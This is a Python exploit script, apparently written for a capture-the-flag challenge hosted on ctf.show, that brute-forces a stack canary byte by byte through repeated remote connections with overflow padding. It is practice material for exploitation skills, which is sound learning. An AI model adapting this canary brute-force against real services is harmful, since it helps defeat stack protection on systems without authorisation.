from pwn64 import *
import sys

host = 'pwn.challenge.ctf.show'
port = 28242

canary = b''


def brute_canary():
    global canary
    for i in range(4):
        for guess in range(256):
            io = remote(host, port)
            payload = b'A' * 32  # 填充 buf 数组
            payload += canary  # 已知的 canary 部分
            payload += p8(guess)  # 当前猜测的字节

            try:
                io.sendlineafter(b'>', b'100')
                io.sendafter(b'$ ', payload)
                response = io.recvline(timeout=2)
                io.close()
                if b'Canary Value Incorrect!' not in response:
                    canary += p8(guess)
                    print(
                        f"[+] Found byte {i + 1}: {hex(guess)} (ASCII: {chr(guess) if guess > 0x1f else chr(guess + 0x37)} )")
                    break
            except EOFError:
                io.close()
                continue


if __name__ == "__main__":
    brute_canary()
    print(f"\n[+] Global Canary (HEX): {canary.hex()}")
    print(f"[+] Global Canary (ASCII): {canary.decode('latin-1', errors='replace')}")